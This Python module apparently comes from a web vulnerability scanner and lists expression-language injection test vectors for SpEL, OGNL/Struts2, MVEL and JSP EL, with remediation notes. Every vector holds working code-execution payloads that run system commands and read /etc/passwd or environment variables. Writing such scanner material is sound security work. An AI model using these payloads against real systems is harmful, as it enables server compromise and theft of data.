"""
Expression Language Injection Test Vectors
Targets template engines and EL processors (Spring EL, OGNL, MVEL, Unified EL)
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, ConfidenceLevel, SensitivityLevel
)

EL_INJECTION_VECTORS = [
    TestVector(
        id="el-spring-001",
        name="Spring Expression Language (SpEL) Injection RCE",
        description="Execute arbitrary code through Spring Expression Language injection",
        vuln_type=VulnerabilityType.EL_INJECTION,
        position=Position(type=PositionType.QUERY, name="expression", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="T(java.lang.Runtime).getRuntime().exec('whoami')",
            variants=[
                "#this.getClass().forName('java.lang.Runtime').getRuntime().exec('id')",
                "T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','whoami'})",
                "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())",
                "${T(java.lang.System).getenv()}"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=["Command execution", "SpEL evaluated", "System command output", "uid="],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["el-injection", "spel", "spring", "rce", "java"],
        references=[
            "https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/",
            "https://github.com/veracode-research/rogue-jndi",
            "https://portswigger.net/research/server-side-template-injection"
        ],
        remediation="Avoid evaluating user input as SpEL, use parameterized queries, implement expression whitelisting"
    ),
    
    TestVector(
        id="el-ognl-001",
        name="OGNL (Object-Graph Navigation Language) Injection",
        description="Exploit OGNL injection in Struts2 and other frameworks for RCE",
        vuln_type=VulnerabilityType.EL_INJECTION,
        position=Position(type=PositionType.BODY_FORM, name="redirect", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
            variants=[
                "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}",
                "${@java.lang.Runtime@getRuntime().exec('id')}",
                "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='cat /etc/passwd').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd})).(#p.start())}"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=["OGNL executed", "Command output", "Struts vulnerability exploited"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["el-injection", "ognl", "struts2", "rce", "java"],
        references=[
            "https://struts.apache.org/security/",
            "https://github.com/vulhub/vulhub/tree/master/struts2",
            "https://cwiki.apache.org/confluence/display/WW/S2-045"
        ],
        remediation="Upgrade Struts2, disable dynamic method invocation, validate all input, use security interceptors"
    ),
    
    TestVector(
        id="el-mvel-001",
        name="MVEL Expression Language Injection",
        description="Exploit MVEL template engine for code execution",
        vuln_type=VulnerabilityType.EL_INJECTION,
        position=Position(type=PositionType.BODY_JSON, name="template", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="@{Runtime.getRuntime().exec('whoami')}",
            variants=[
                "@{java.lang.Runtime.getRuntime().exec('id')}",
                "@{new java.io.File('/etc/passwd').exists()}",
                "@{System.getProperty('user.name')}",
                "@{java.lang.Runtime.getRuntime().exec(new String[]{'bash','-c','cat /etc/passwd'})}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["MVEL expression evaluated", "Code execution", "System property access"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["el-injection", "mvel", "rce", "template-engine", "java"],
        references=[
            "https://0ang3el.blogspot.com/2016/07/beware-of-mvel-code-execution.html",
            "https://blog.gypsyengineer.com/en/security/detecting-dangerous-spring-exporters-with-codeql.html",
            "https://github.com/mvel/mvel"
        ],
        remediation="Avoid MVEL on user input, use sandboxed mode, validate expressions, disable dangerous features"
    ),
    
    TestVector(
        id="el-unified-001",
        name="Unified Expression Language (JSP EL) Injection",
        description="Exploit JSP Unified EL for information disclosure and code execution",
        vuln_type=VulnerabilityType.EL_INJECTION,
        position=Position(type=PositionType.QUERY, name="param", value_prefix="${", value_suffix="}"),
        payload=PayloadTemplate(
            base="''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')",
            variants=[
                "applicationScope",
                "sessionScope['user']",
                "''.getClass().forName('java.lang.System').getProperty('user.dir')",
                "pageContext.request.getSession().getAttribute('user')",
                "'test'.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=["EL evaluated", "Session data disclosed", "System properties exposed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["el-injection", "jsp", "unified-el", "java", "information-disclosure"],
        references=[
            "https://www.exploit-db.com/docs/english/46303-oracle-application-testing-suite-unified-expression-language-injection.pdf",
            "https://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html",
            "https://www.owasp.org/index.php/Expression_Language_Injection"
        ],
        remediation="Sanitize EL expressions, use safe EL resolvers, implement expression validation, upgrade JSP/JSTL"
    )
]
